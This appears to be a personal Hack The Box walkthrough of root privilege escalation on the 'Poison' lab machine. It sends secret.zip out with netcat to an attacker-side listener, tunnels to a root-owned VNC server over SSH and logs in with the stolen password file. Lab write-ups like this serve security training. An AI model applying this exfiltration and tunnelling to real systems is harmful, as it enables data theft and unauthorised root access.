# Privilege Escalation

## root
- First copy the secret.zip from the box to the local machine `cat secret.zip | nc 10.10.14.15 9001` on the remote machine while running `nc -lnvp 9001 > secret.zip`.
- Extract secret.zip using the password for charix

- Running ps aux, we can see root is running a  vnc server.
- ![[Pasted image 20210408101125.png]]
-  We can check netstat using `netstat -anlp tcp` to see that there can be two ports 5901 and 5801.We can use wget to check the headers from both the ports. Port 5901 seems like it.
- ![[Pasted image 20210408101108.png]]
- We can use ssh to tunnel to the box and configure it to port 5901. `ssh -L5901:127.0.0.1:5901 charix@10.10.10.84`, this way when we ping our port 5901, we are tunneling. This is also done because the server is running locally and we can't connect to it remotely.
- Now connect to the vncserver using vncviewer we are asked to authenticate
```bash
╭─norman@kali ~/Hack-The-Box/machines/poison ‹main*› 
╰─$ vncviewer 127.0.0.1:5901
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password: 
```
- We can use the secret file got from secret.zip as the password file, and get the root shell.
- ![[Pasted image 20210408101717.png]]
- ![[Pasted image 20210408101705.png]]